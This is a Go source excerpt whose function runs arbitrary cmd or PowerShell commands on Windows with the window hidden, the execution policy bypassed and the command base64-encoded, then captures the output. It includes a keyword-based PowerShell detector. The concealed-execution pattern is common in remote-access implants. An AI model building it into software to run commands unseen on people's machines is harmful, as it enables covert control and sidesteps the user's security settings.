// Windows-specific command execution function
func executeCommandHidden(command string) (string, error) {
	if runtime.GOOS != "windows" {
		cmd := exec.Command("sh", "-c", command)
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("[ERROR] Command execution failed: %v", err), nil
		}
		if len(output) > 1024*1024 { // 1MB limit
			output = append(output[:1024*1024], []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
		}
		return string(output), nil
	}

	// Detect if this is a PowerShell command
	isPowerShell := isPowerShellCommand(command)

	// Create anonymous pipes for capturing output
	var saAttr SECURITY_ATTRIBUTES
	saAttr.NLength = uint32(unsafe.Sizeof(saAttr))
	saAttr.bInheritHandle = 1 // Set inherit handle to true
	saAttr.LPSecurityDescriptor = 0

	// Create stdout pipe
	var stdoutRead, stdoutWrite uintptr
	ret, _, _ := procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stdoutRead)),
		uintptr(unsafe.Pointer(&stdoutWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		return "", fmt.Errorf("failed to create stdout pipe")
	}

	// Create stderr pipe
	var stderrRead, stderrWrite uintptr
	ret, _, _ = procCreatePipe.Call(
		uintptr(unsafe.Pointer(&stderrRead)),
		uintptr(unsafe.Pointer(&stderrWrite)),
		uintptr(unsafe.Pointer(&saAttr)),
	)
	if ret == 0 {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		return "", fmt.Errorf("failed to create stderr pipe")
	}

	// Prepare the command line
	var cmdLine *uint16
	var shell string
	if isPowerShell {
		// Use PowerShell with hidden window and bypass execution policy
		// Encode the command as base64 to handle special characters and ensure proper execution
		encodedCommand := base64.StdEncoding.EncodeToString([]byte(command))
		shell = fmt.Sprintf("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand %s", encodedCommand)
	} else {
		// Use cmd for regular commands
		shell = fmt.Sprintf("cmd /C %s", command)
	}
	cmdLine, err := syscall.UTF16PtrFromString(shell)
	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Initialize STARTUPINFO structure with pipe handles
	var si STARTUPINFO
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
	si.ShowWindow = SW_HIDE // Hide the window
	si.StdInput = 0        // Use default input
	si.StdOutput = stdoutWrite // Redirect stdout to our pipe (child writes to this)
	si.StdError = stderrWrite  // Redirect stderr to our pipe (child writes to this)

	// Initialize PROCESS_INFORMATION structure
	var pi PROCESS_INFORMATION

	// Create the process with hidden window and redirected output
	err = createProcess(
		nil, // applicationName
		cmdLine, // commandLine
		nil, // processAttributes
		nil, // threadAttributes
		true, // inheritHandles - important for pipe inheritance
		CREATE_NO_WINDOW, // creationFlags - this is key for hiding the window
		0, // environment
		nil, // currentDirectory
		&si, // startupInfo
		&pi, // processInformation
	)

	if err != nil {
		syscall.CloseHandle(syscall.Handle(stdoutRead))
		syscall.CloseHandle(syscall.Handle(stdoutWrite))
		syscall.CloseHandle(syscall.Handle(stderrRead))
		syscall.CloseHandle(syscall.Handle(stderrWrite))
		return "", err
	}

	// Close the write handles for both PowerShell and regular commands
	syscall.CloseHandle(syscall.Handle(stdoutWrite))
	syscall.CloseHandle(syscall.Handle(stderrWrite))

	defer syscall.CloseHandle(syscall.Handle(pi.Process))
	defer syscall.CloseHandle(syscall.Handle(pi.Thread))

	stdoutChan := make(chan []byte)
	stderrChan := make(chan []byte)

	go func() {
		var stdoutBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stdoutRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stdoutBytes = append(stdoutBytes, buffer[:remaining]...)
				stdoutBytes = append(stdoutBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stdoutBytes = append(stdoutBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stdoutChan <- stdoutBytes
	}()

	go func() {
		var stderrBytes []byte
		var buffer [4096]byte
		var bytesRead uint32
		totalRead := 0
		const maxSize = 1024 * 1024 // 1MB limit

		for {
			// Check if we've reached the size limit
			if totalRead >= maxSize {
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			ret, _, _ := procReadFile.Call(
				stderrRead,
				uintptr(unsafe.Pointer(&buffer[0])),
				uintptr(len(buffer)),
				uintptr(unsafe.Pointer(&bytesRead)),
				0,
			)

			// Only continue if we successfully read data and haven't exceeded size
			if ret == 0 || bytesRead == 0 {
				break
			}

			// Check if adding this chunk would exceed our size limit
			if totalRead + int(bytesRead) > maxSize {
				// Only add what fits within our limit
				remaining := maxSize - totalRead
				stderrBytes = append(stderrBytes, buffer[:remaining]...)
				stderrBytes = append(stderrBytes, []byte("\n[OUTPUT TRUNCATED: Max size reached]")...)
				break
			}

			stderrBytes = append(stderrBytes, buffer[:bytesRead]...)
			totalRead += int(bytesRead)
		}
		stderrChan <- stderrBytes
	}()

	result, err := syscall.WaitForSingleObject(syscall.Handle(pi.Process), 60000) // 60 second timeout
	if err != nil || result == syscall.WAIT_TIMEOUT {
		// If timeout occurs, try to terminate the process gracefully
		syscall.TerminateProcess(syscall.Handle(pi.Process), 255)
		return fmt.Sprintf("[ERROR] Command execution timed out after 60 seconds"), nil
	}

	stdoutBytes := <-stdoutChan
	stderrBytes := <-stderrChan

	// Close the read handles
	syscall.CloseHandle(syscall.Handle(stdoutRead))
	syscall.CloseHandle(syscall.Handle(stderrRead))

	output := string(stdoutBytes) + string(stderrBytes)

	// Get the exit code of the process
	var exitCode uint32
	procGetExitCodeProcess.Call(
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&exitCode)),
	)

	// If no output and process exited with error, return error info
	if len(output) == 0 && exitCode != 0 {
		return fmt.Sprintf("[ERROR] Command execution failed with exit code: %d", exitCode), nil
	}

	if output == "" {
		return "[Command executed successfully - no output]", nil
	}

	return output, nil
}

// isPowerShellCommand detects if a command is a PowerShell command based on common PowerShell patterns
func isPowerShellCommand(command string) bool {
	// Convert to lowercase for pattern matching
	cmdLower := strings.ToLower(command)

	// Check for PowerShell-specific patterns
	powerShellPatterns := []string{
		"$",                    // PowerShell variables
		"get-",                 // PowerShell cmdlets
		"set-",                 // PowerShell cmdlets
		"new-",                 // PowerShell cmdlets
		"remove-",              // PowerShell cmdlets
		"invoke-",              // PowerShell cmdlets
		"select-",              // PowerShell cmdlets
		"where-",               // PowerShell cmdlets
		"foreach-",             // PowerShell cmdlets
		"out-",                 // PowerShell cmdlets
		"export-",              // PowerShell cmdlets
		"import-",              // PowerShell cmdlets
		"write-",               // PowerShell cmdlets
		"read-",                // PowerShell cmdlets
		"clear-",               // PowerShell cmdlets
		"update-",              // PowerShell cmdlets
		"get-service",          // PowerShell cmdlets
		"get-wmiobject",        // PowerShell cmdlets
		"get-ciminstance",      // PowerShell cmdlets
		"start-process",        // PowerShell cmdlets
		"stop-service",         // PowerShell cmdlets
		"restart-service",      // PowerShell cmdlets
		"set-service",          // PowerShell cmdlets
		"try {",                // PowerShell try-catch blocks
		"catch {",              // PowerShell try-catch blocks
		"finally {",            // PowerShell try-catch blocks
		"get-itemproperty",     // Registry operations
		"set-itemproperty",     // Registry operations
		"new-object",           // PowerShell object creation
		"add-type",             // PowerShell type definitions
	}

	// Count matching patterns
	patternCount := 0
	for _, pattern := range powerShellPatterns {
		if strings.Contains(cmdLower, pattern) {
			patternCount++
			// If we find 2 or more PowerShell patterns, it's likely a PowerShell command
			if patternCount >= 2 {
				return true
			}
		}
	}

	// Additional check: if it has PowerShell variable assignment pattern
	if strings.Contains(cmdLower, "$") && (strings.Contains(cmdLower, " = ") || strings.Contains(cmdLower, "=")) {
		return true
	}

	return patternCount > 0
}